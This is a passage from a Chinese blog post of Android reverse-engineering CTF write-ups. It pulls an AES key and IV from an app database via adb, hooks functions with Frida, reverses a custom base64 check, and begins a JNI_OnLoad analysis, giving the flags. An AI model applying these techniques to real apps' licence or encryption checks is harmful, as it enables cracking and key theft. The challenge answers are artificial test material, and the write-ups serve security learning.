class="line">    <span class="type">AppConfig</span> <span class="variable">agency</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppConfig</span>();</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> <span class="built_in">this</span>.myDataBase.rawQuery(SELECT_QUERY, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">        agency.setId(cursor.getInt(<span class="number">0</span>));</span><br><span class="line">        agency.setName(cursor.getString(<span class="number">1</span>));</span><br><span class="line">        agency.setInstallDate(cursor.getString(<span class="number">2</span>));</span><br><span class="line">        agency.setValidLicence(cursor.getInt(<span class="number">3</span>) &gt; <span class="number">0</span>);</span><br><span class="line">        agency.setSecurityIv(cursor.getString(<span class="number">4</span>));</span><br><span class="line">        agency.setSecurityKey(cursor.getString(<span class="number">5</span>));</span><br><span class="line">        agency.setDesc(cursor.getString(<span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> agency;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现在这里设置了iv和Key</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Context myContext;</span><br><span class="line"><span class="keyword">private</span> SQLiteDatabase myDataBase;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String DB_PATH = <span class="string">&quot;/data/data/edu.sharif.ctf/databases/&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String DB_NAME = <span class="string">&quot;db.db&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">static</span> String TABLE_NAME = <span class="string">&quot;config&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String UPDATE_QUERY = <span class="string">&quot;UPDATE &quot;</span> + TABLE_NAME + <span class="string">&quot; SET d=?&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String SELECT_QUERY = <span class="string">&quot;SELECT  * FROM &quot;</span> + TABLE_NAME + <span class="string">&quot; WHERE a=1&quot;</span>;</span><br></pre></td></tr></table></figure><p>是从数据库中得到的，且有给出路径，那么直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/edu.sharif.ctf/databases/db.db</span><br></pre></td></tr></table></figure><p>获得数据库，然后就能得到iv和Key了</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456733.png" alt="image-20250331151635178" style="zoom:50%;" /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iv=a5efdbd57b84ca36 </span><br><span class="line">key=37eaae0141f1a3adf8a1dee655853714</span><br></pre></td></tr></table></figure><p>因为AES CBC是对称加密的，所以加解密的Key都是一样的</p><p>写个解密AES&#x2F;CBC&#x2F;PKCS5Padding的java类即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String iv=<span class="string">&quot;a5efdbd57b84ca36&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String Key=<span class="string">&quot;37eaae0141f1a3adf8a1dee655853714&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String en_text=<span class="string">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String data=<span class="built_in">decrypt</span>(en_text,Key,iv);</span><br><span class="line">        System.out.<span class="built_in">println</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">decrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> <span class="built_in">SecretKeySpec</span>(<span class="built_in">hexStringToBytes</span>(paramString2), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            Cipher localCipher = Cipher.<span class="built_in">getInstance</span>(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">            localCipher.<span class="built_in">init</span>(Cipher.DECRYPT_MODE, localSecretKeySpec, <span class="keyword">new</span> <span class="built_in">IvParameterSpec</span>(paramString3.<span class="built_in">getBytes</span>()));</span><br><span class="line">            byte[] bytes = localCipher.<span class="built_in">doFinal</span>(<span class="built_in">hexStringToBytes</span>(paramString1));</span><br><span class="line">            String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">                flag += (<span class="type">char</span>) b;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="built_in">catch</span> (Exception localException) &#123;</span><br><span class="line">            localException.<span class="built_in">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">bytesToHexString</span><span class="params">(byte[] bytes)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">            sb.<span class="built_in">append</span>(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.<span class="built_in">valueOf</span>(b &amp; <span class="number">255</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> byte[] <span class="built_in">hexStringToBytes</span>(String s) &#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">        byte[] data = <span class="keyword">new</span> byte[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (byte) ((Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功得到<code>fl-ag-IS-se-ri-al-NU-MB-ER</code></p><h2 id="2015-0CTF-vezel"><a href="#2015-0CTF-vezel" class="headerlink" title="2015-0CTF-vezel"></a>2015-0CTF-vezel</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">confirm</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> getPackageName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">first</span> <span class="operator">=</span> String.valueOf(getSig(s));</span><br><span class="line">    <span class="type">String</span> <span class="variable">next</span> <span class="operator">=</span> getCrc();</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;0CTF&#123;&quot;</span> + first + next + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag.equals(<span class="built_in">this</span>.et.getText().toString())) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Yes!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;0ops!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要代码如上，发现是通过getSig和getCrc来拼接获得flag的</p><p>那么考虑直接hook getSig和getCrc获得对应的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">MainActivity</span> <span class="operator">=</span> Java.use(<span class="string">&#x27;com.ctf.vezel.MainActivity&#x27;</span>);</span><br><span class="line">    MainActivity.getSig.implementation = function(packageName) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getSig(packageName);</span><br><span class="line">        console.log(<span class="string">&quot;Signature hashCode: &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    MainActivity.getCrc.implementation = function() &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getCrc();</span><br><span class="line">        console.log(<span class="string">&quot;Crs: &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Signature hashCode: <span class="number">-183971537</span></span><br><span class="line">Crs: <span class="number">1189242199</span></span><br></pre></td></tr></table></figure><p>得到flag为<code>0CTF&#123;-1839715371189242199&#125;</code></p><h2 id="2017-XMAN-HelloSmali2"><a href="#2017-XMAN-HelloSmali2" class="headerlink" title="2017 XMAN HelloSmali2"></a>2017 XMAN HelloSmali2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hellosmali.hellosmali;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: D:\android_re\CTF\wiki\hello\sec.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input != <span class="literal">null</span> &amp;&amp; input.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] charinput = input.toCharArray();</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : charinput) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">intinput</span> <span class="operator">=</span> Integer.toBinaryString(c);</span><br><span class="line">                <span class="keyword">while</span> (intinput.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    intinput = <span class="string">&quot;0&quot;</span> + intinput;</span><br><span class="line">                &#125;</span><br><span class="line">                v2.append(intinput);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (v2.length() % <span class="number">6</span> != <span class="number">0</span>) &#123; <span class="comment">// 字符串的长度要是6的倍数</span></span><br><span class="line">                v2.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> String.valueOf(v2);</span><br><span class="line">            <span class="type">char</span>[] v4 = <span class="keyword">new</span> <span class="title class_">char</span>[v1.length() / <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; v4.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v6</span> <span class="operator">=</span> Integer.parseInt(v1.substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">                v1 = v1.substring(<span class="number">6</span>);</span><br><span class="line">                v4[i] = <span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>.charAt(v6);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(String.valueOf(v4));</span><br><span class="line">            <span class="keyword">if</span> (input.length() % <span class="number">3</span> != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (input.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                    v3.append(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v3.append(<span class="string">&quot;!?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> String.valueOf(v3);</span><br><span class="line">            <span class="keyword">if</span> (key.equals(<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">re1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String key=<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>;</span><br><span class="line">        String charset=<span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        key=key.substring(<span class="number">0</span>,key.length()-<span class="number">2</span>);</span><br><span class="line">        System.out.println(key);</span><br><span class="line">        StringBuilder binary_string=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;key.length();i++)&#123;</span><br><span class="line">            <span class="type">char</span> c=key.charAt(i);</span><br><span class="line">            <span class="type">int</span> index=charset.indexOf(c);</span><br><span class="line">            String binary=String.format(<span class="string">&quot;%6s&quot;</span>,Integer.toBinaryString(index)).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            binary_string.append(binary);</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder result=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String binary=binary_string.toString();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;binary.length();i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">8</span>&gt;binary.length())&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String byteStr=binary.substring(i,i+<span class="number">8</span>);</span><br><span class="line">            <span class="type">int</span> charCode=Integer.parseInt(byteStr,<span class="number">2</span>);</span><br><span class="line">            result.append((<span class="type">char</span>)charCode);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsZDluYYreJDyrpDpucZCo</span><br><span class="line">eM_5m4Li_i4_Ea5y</span><br></pre></td></tr></table></figure><p>得到结果</p><h1 id="静态分析原生层"><a href="#静态分析原生层" class="headerlink" title="静态分析原生层"></a>静态分析原生层</h1><h2 id="2015-海峡两岸-一个-APK，逆向试试吧"><a href="#2015-海峡两岸-一个-APK，逆向试试吧" class="headerlink" title="2015 - 海峡两岸 - 一个 APK，逆向试试吧"></a>2015 - 海峡两岸 - 一个 APK，逆向试试吧</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> native boolean <span class="title">testFlag</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> &#123;</span><br><span class="line">    System.<span class="built_in">loadLibrary</span>(<span class="string">&quot;mobicrackNDK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_crack_me);</span><br><span class="line">    <span class="keyword">this</span>.inputButton = (Button) <span class="built_in">findViewById</span>(R.id.input_button);</span><br><span class="line">    <span class="keyword">this</span>.pwdEditText = (EditText) <span class="built_in">findViewById</span>(R.id.pwd);</span><br><span class="line">    <span class="keyword">this</span>.inputButton.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: com.example.mobicrackndk.CrackMe.1</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">            CrackMe.<span class="keyword">this</span>.input = CrackMe.<span class="keyword">this</span>.pwdEditText.<span class="built_in">getText</span>().<span class="built_in">toString</span>();</span><br><span class="line">            <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.input != null) &#123;</span><br><span class="line">                <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.<span class="built_in">testFlag</span>(CrackMe.<span class="keyword">this</span>.input)) &#123;</span><br><span class="line">                    Toast.<span class="built_in">makeText</span>(CrackMe.<span class="keyword">this</span>, CrackMe.<span class="keyword">this</span>.input, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.<span class="built_in">makeText</span>(CrackMe.<span class="keyword">this</span>, <span class="string">&quot;Wrong flag&quot;</span>, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出，testFlag就是核心的函数，加载的mobicrackNDK</p><p>但是so文件dump下来直接搜索符号是没有的，因此考虑寻找<code>JNI_Onload</code>函数（通过 <code>JNI_OnLoad</code> 动态注册）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+4h] [bp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+Ch] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;JNI_OnLoad&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*vm)-&gt;<span class="built_in">GetEnv</span>(vm, (<span class="type">void</span> **)&amp;v8, <span class="number">65540</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v3 = v8;</span><br><span class="line">  v4 = classPathName[<span class="number">0</span>];</span><br><span class="line">  stream = (FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>((FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>), <span class="string">&quot;RegisterNatives start for &#x27;%s&#x27;&quot;</span>, classPathName[<span class="number">0</span>]);</span><br><span class="line">  v5 = (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">char</span> *))(*(_DWORD *)v3 + <span class="number">24</span>))(v3, v4);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">&quot;Native registration unable to find class &#x27;%s&#x27;&quot;</span>, v4);</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;GetEnv failed&quot;</span>, (FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">char</span> **, <span class="type">int</span>))(*(_DWORD *)v3 + <span class="number">860</span>))(v3, v5, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">&quot;RegisterNatives failed for &#x27;%s&#x27;&quot;</span>, v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65540</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">char</span> **, <span class="type">int</span>))(*(_DWORD *)v3 + <span class="number">860</span>))(v3, v5, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这就是注册的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000400</span>C off_400C        DCD aTestflag           ; DATA XREF: JNI_OnLoad+<span class="number">60</span>↑o</span><br><span class="line">.data:<span class="number">0000400</span>C                                         ; JNI_OnLoad+<span class="number">68</span>↑o ...</span><br><span class="line">.data:<span class="number">0000400</span>C                                         ; <span class="string">&quot;testFlag&quot;</span></span><br><span class="line">.data:<span class="number">00004010</span>                 DCD aLjavaLangStrin_0   ; <span class="string">&quot;(Ljava/lang/String;)Z&quot;</span></span><br><span class="line">.data:<span class="number">00004014</span>                 DCD abcdefghijklmn+<span class="number">1</span></span><br><span class="line">.data:<span class="number">00004018</span>                 DCD aHello              ; <span class="string">&quot;hello&quot;</span></span><br><span class="line">.data:<span class="number">0000401</span>C                 DCD aLjavaLangStrin_1   ; <span class="string">&quot;()Ljava/lang/String;&quot;</span></span><br><span class="line">.data:<span class="number">00004020</span>                 DCD native_hello+<span class="number">1</span></span><br><span class="line">.data:<span class="number">00004020</span> ; .data         ends</span><br></pre></td></tr></table></figure><p>可以看到testFlag就是abcdefghijklmn函数，第二个参数括弧里的是参数，括弧外的是返回值的类型，可以看到testFlag函数的参数类型是String，参数返回类型是bool型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br></pre></td></tr></table></figure><ul><li><code>a1</code>：<code>JNIEnv*</code> 指针（通过 <code>jniEnv</code> 